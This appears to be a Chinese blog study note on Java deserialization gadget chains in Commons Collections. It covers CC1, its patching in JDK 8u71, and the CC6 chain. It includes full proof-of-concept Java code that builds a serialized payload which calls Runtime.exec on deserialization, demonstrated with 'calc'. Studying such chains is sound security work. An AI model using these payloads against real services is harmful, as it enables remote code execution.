# 回顾CC1

简单回顾一下CC1。

jdk8u65版本及更早版本。

有两条链，分别利用了TransformedMap和LazyMap类。

首先回顾一下相同的部分：

InvokerTransformer、ConstantTransformer和ChainedTransformer。

InvokerTransformer：transform函数可以调用传入对象的任意方法。

ConstantTransformer：transform函数直接返回一个对象。

ChainedTransformer：transform函数依次调用传入的Transform子类。

结合起来：

```java
Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.getRuntime()),
            new InvokerTransformer("exec",new Class[] {String.class},new Object[] {"calc"})
        };
Transformer transformerChain = new ChainedTransformer(transformers);
```

但是因为Runtime没有实现java.io.Serializable接口，所以需要用反射来获取Runtime对象。

```java
Method method = Runtime.class.getMethod("getRuntime");
Runtime r= (Runtime) method.invoke(null);
r.exec("calc");
```

修改后：

```java
Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null, new Object[0]}),
            new InvokerTransformer("exec",new Class[] {String.class},new String[] {"calc"})
        };
Transformer transformerChain = new ChainedTransformer(transformers);
```

如何触发transformerChain的transform呢？

## 1.TransformedMap

TransformedMap构造函数的作用域是protected，但是有一个static函数decorate会调用构造方法，且checkSetValue函数调用了transform。这就可以创建TransformedMap的对象并且通过反射调用CheckSetValue，传入的参数为transformerChain。

但是无法进一步找到利用此方法的函数或类，需要另寻他法。

寻找其它调用checkSetValue的类，发现TransformedMap父类AbstractInputCheckedMapDecorator的内部的MapEntry类中的setValue函数也调用了checkSetValue。setValue() 实际上就是在 Map 中对一组 entry（键值对）进行 setValue() 操作。所以，我们在进行 .decorate 方法调用，进行 Map 遍历的时候，就会走到 setValue() 当中，而 setValue() 就会调用 checkSetValue。

巧的是AnnotationInvocationHandler中readObject里包含了setValue，可以作为入口类。

注：decorate触发map遍历这里不是很清楚，猜测是这一部分触发的：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231123141251.png)

## 2.LazyMap

前面transformerChain都是一样的，区别在于如何调用transformerChain。

LazyMap是在其get函数中执行的 factory.transform 。

![image-20231123143334594](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20231123143334594.png)

虽然AnnotationInvocationHandler的readObject并没有直接调用和这个函数，但是AnnotationInvocationHandler类的invoke函数执行了memberValues.get(member)。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231123143348.png)

利用Java的对象代理调用get（用Proxy代理InvocationHandler，调用任意方法就会进入invoke）。这个暂时不深究了，能力不够。

## 小结

一定要多想多练，看会了是没用的。

# 简介

CommonsCollections1这个利用链在jdk8u71后不能再利用了，主要原因是 sun.reflect.annotation.AnnotationInvocationHandler#readObject的逻辑变化了。  

在ysoserial中， CommonsCollections6可以说是commons-collections这个库中相对比较通用的利用链。

# 环境搭建

- [Jdk 8u71](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)
- Comoons-Collections 3.2.1

# CC1无法利用的原因

首先，可以发现用cc1的两条链均无法执行命令。

对于TransformedMap链，可以看到AnnotationInvocationHandler中readObject函数已经没有了setValue。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231124123859.png)

实际上原因和setValue关系不大。改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。  

对于LazyMap链，AnnotationInvocationHandler中readObject函数默认的defaultReadObject变成了readFields。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231124132636.png)

defaultReadObject 可以恢复对象本身的类属性，比如this.memberValues就能恢复成我们原本设置的恶意类，但通过readFields方式，this.memberValues 就为null，所以后续执行get()就必然没发触发，这也就是高版本不能使用的原因。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231124134244.png)

# CommonsCollections6

先贴p神的简化版gadget chain：

```java
Gadget chain:
java.io.ObjectInputStream.readObject()
	java.util.HashMap.readObject()
		java.util.HashMap.hash()
			org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
			org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
				org.apache.commons.collections.map.LazyMap.get()
					org.apache.commons.collections.functors.ChainedTransformer.transform()
						org.apache.commons.collections.functors.InvokerTransformer.transform()
							java.lang.reflect.Method.invoke()
								java.lang.Runtime.exec()
```

## HashMap

有一种似曾相识的感觉，好像和URLDNS类似。

readObject的hash()：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231124142016.png)

查看hash方法：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231124142207.png)

如果key不为null，就调用key.hashCode。而key又是可控的，那么就可以调用任意类的hashCode方法。

这里自己去找不太现实，直接选择相信p神：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231124143046.png)

找到TiedMapEntry的hashCode

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231124143151.png)

有个getValue()，看一下：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231124143305.png)

发现有个get()，那不是又能调用LazyMap的transform了？

![image-20231124145256761](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20231124145256761.png)

## 构建利用代码

transform这部分和CC1相同：

```java
Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime", null}),
            new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null, null}),
            new InvokerTransformer("exec",new Class[] {String.class},new String[] {"calc"})
};
```

同样通过LazyMap的decorate方法创建对象：

```java
Map innerMap = new HashMap();
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```

现在，我拿到了⼀个恶意的LazyMap对象 outerMap ，可以将其作为 TiedMapEntry 的map属性。

TiedMapEntry实现了Serializable接口且构造函数的作用域是public，所以直接实例化：

```java
TiedMapEntry tme = new TiedMapEntry(outerMap,"Troy3e");
```

如何调用TiedMapEntry的hashCode？我们需要将tme作为HashMap的key。

```java
HashMap hashMap = new HashMap();
hashMap.put(tme,"Troy3e");
```

整合起来：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null, null}),
                new InvokerTransformer("exec",new Class[] {String.class},new String[] {"calc"})
        };
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap,"Troy3e");
        HashMap hashMap = new HashMap();
        hashMap.put(tme,"Troy3e");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashMap);
        oos.close();
    }
}
```

发现运行也会弹出计算器干扰，所以先设置一个faketransformer，最后再通过反射修改回来：

```java
import com.sun.net.httpserver.Filter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null, null}),
                new InvokerTransformer("exec",new Class[] {String.class},new String[] {"calc"})
        };
        ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap,"Troy3e");
        HashMap hashMap = new HashMap();
        hashMap.put(tme,"Troy3e");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashMap);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

然而运行发现并没有弹出计算器。

调试发现ChainedTransformer的transform方法，本该传进去的trainsformerChain变成了Troy3e：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231124181110.png)

其实，这个关键点就出在 expMap.put(tme, "valuevalue"); 这个语句里面。
HashMap的put方法中，也有调用到 hash(key) ：  

```java
public V put(K key, V value) {
	return putVal(hash(key), key, value, false, true);
}
```

这⾥就导致 LazyMap 这个利用链在这里被调用了⼀遍，因为我前⾯用了 fakeTransformers ，所以此时并没有触发命令执⾏，但实际上也对我们构造Payload产生了影响。

我们的解决方法也很简单，只需要将keykey这个Key，再从outerMap中移除即可： outerMap.remove("keykey") 。  

最终POC：

```java
import com.sun.net.httpserver.Filter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null, null}),
                new InvokerTransformer("exec",new Class[] {String.class},new String[] {"calc"})
        };
        ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap,"Troy3e");
        HashMap hashMap = new HashMap();
        hashMap.put(tme,"Troy3eTroy3e");
        outerMap.remove("Troy3e");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashMap);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

## 注意事项

1. 有个小地方容易想不明白的就是创建TiedMapEntry对象的时候随便传入的key值。可能会想会把它当作transform里的参数执行。其实这个值并不重要，原因如下：

   ![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231126142539.png)

2. 关于p神所说hashMap.put(tme,"Troy3eTroy3e")——“因为我前面用了 fakeTransformers ，所以此时并没有触发命令执行，但实际上也对我们构造Payload产⽣了影响。”解决办法是remove掉这个多的key。但是具体怎么影响的还是不清楚，暂且搁置。也有别的师傅是反射修改LazyMap的，但是我试了报错说不能set final参数。

# 总结

CC6 链被称为最好用的 CC 链，是因为其不受 jdk 版本的影响，无论是 jdk8u65，或者 jdk9u312 都可以复现。

# 参考链接

- https://wx.zsxq.com/dweb2/index/group/2212251881
- https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/